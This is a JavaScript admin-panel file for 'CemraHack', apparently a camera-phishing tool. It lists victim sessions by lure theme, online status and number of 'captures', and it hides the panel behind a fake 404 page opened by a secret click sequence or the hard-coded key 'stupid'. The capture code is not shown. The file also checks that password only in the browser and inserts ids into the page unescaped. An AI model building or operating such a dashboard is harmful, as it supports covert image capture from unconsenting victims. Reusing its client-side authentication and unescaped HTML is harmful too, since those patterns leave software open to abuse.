/* ================================================
   ADMIN.JS — Admin Panel Logic (CemraHack)
   ================================================ */

const SECRET_KEY = 'stupid';
const AUTH_KEY = 'cemra_admin_auth';

// ---- Auth Logic ----
function checkAuth() {
    const auth = sessionStorage.getItem(AUTH_KEY);
    const errorView = document.getElementById('errorView');
    const adminView = document.getElementById('adminView');

    // Check URL params for quick access (?key=stupid)
    const params = new URLSearchParams(window.location.search);
    if (params.get('key') === SECRET_KEY) {
        sessionStorage.setItem(AUTH_KEY, 'true');
        window.location.href = 'admin.html'; // Clean URL
        return;
    }

    if (auth === 'true') {
        errorView.classList.add('admin-hidden');
        adminView.classList.remove('admin-hidden');
        document.body.classList.remove('overflow-hidden');
        document.title = "CemraHack Admin Dashboard";
        initDashboard();
    }
}

// Secret trigger: Clicking the 404 title 5 times
let clickCount = 0;
document.querySelector('#errorView h1').onclick = () => {
    clickCount++;
    if (clickCount >= 5) {
        document.getElementById('authGate').classList.remove('admin-hidden');
        clickCount = 0;
    }
};

function tryLogin() {
    const pass = document.getElementById('adminPass').value;
    if (pass === SECRET_KEY) {
        sessionStorage.setItem(AUTH_KEY, 'true');
        location.reload();
    } else {
        showToast('Invalid Secret Key', 'error');
        document.getElementById('adminPass').value = '';
    }
}

function logout() {
    sessionStorage.removeItem(AUTH_KEY);
    location.reload();
}

// ---- Dashboard Logic ----
function initDashboard() {
    refreshData();
    // Poll for updates every 5 seconds
    setInterval(refreshData, 5000);
}

function refreshData() {
    const sessionIds = JSON.parse(localStorage.getItem('cemra_sessions') || '[]');
    const listBody = document.getElementById('sessionsList');
    listBody.innerHTML = '';

    let totalCaptures = 0;
    let activeNow = 0;

    sessionIds.forEach(id => {
        const captures = JSON.parse(localStorage.getItem('cemra_captures_' + id) || '[]');
        const statusData = JSON.parse(localStorage.getItem('cemra_status_' + id) || '{"status":"offline"}');

        totalCaptures += captures.length;
        const isOnline = statusData.status !== 'offline' && statusData.status !== 'done';
        if (isOnline) activeNow++;

        const row = document.createElement('tr');
        row.innerHTML = `
            <td><span class="user-id">${id}</span></td>
            <td><span style="opacity:0.7">${statusData.theme || 'Unknown'}</span></td>
            <td>
                <span class="status-badge ${isOnline ? 'status-online' : 'status-offline'}">
                    <i class="fa-solid ${isOnline ? 'fa-circle' : 'fa-circle-dot'}"></i>
                    ${statusData.status.toUpperCase()}
                </span>
            </td>
            <td><b style="color:var(--primary)">${captures.length}</b></td>
            <td class="action-btns">
                <button class="btn-sm btn-view" onclick="viewResults('${id}')">
                    <i class="fa-solid fa-eye"></i> View
                </button>
                <button class="btn-sm btn-delete" onclick="deleteSession('${id}')">
                    <i class="fa-solid fa-trash"></i>
                </button>
            </td>
        `;
        listBody.appendChild(row);
    });

    // Update Stats
    document.getElementById('statTotalSessions').textContent = sessionIds.length;
    document.getElementById('statActiveNow').textContent = activeNow;
    document.getElementById('statTotalCaptures').textContent = totalCaptures;

    // Calculate storage
    let bytes = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        bytes += (localStorage.getItem(key).length * 2);
    }
    document.getElementById('statStorage').textContent = (bytes / (1024 * 1024)).toFixed(2) + ' MB';
}

function viewResults(id) {
    window.location.href = `results.html?s=${id}`;
}

function deleteSession(id) {
    if (!confirm(`Are you sure you want to delete session ${id}? All data will be lost.`)) return;

    const sessions = JSON.parse(localStorage.getItem('cemra_sessions') || '[]');
    const updated = sessions.filter(sid => sid !== id);
    localStorage.setItem('cemra_sessions', JSON.stringify(updated));
    localStorage.removeItem('cemra_captures_' + id);
    localStorage.removeItem('cemra_status_' + id);

    showToast('Session deleted permanentely');
    refreshData();
}

// ---- UI Helpers ----
function showToast(msg, type = 'success') {
    const toast = document.getElementById('toast');
    const msgEl = document.getElementById('toastMsg');
    msgEl.textContent = msg;
    toast.style.background = type === 'error' ? '#ef4444' : 'rgba(124, 58, 237, 0.9)';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', checkAuth);
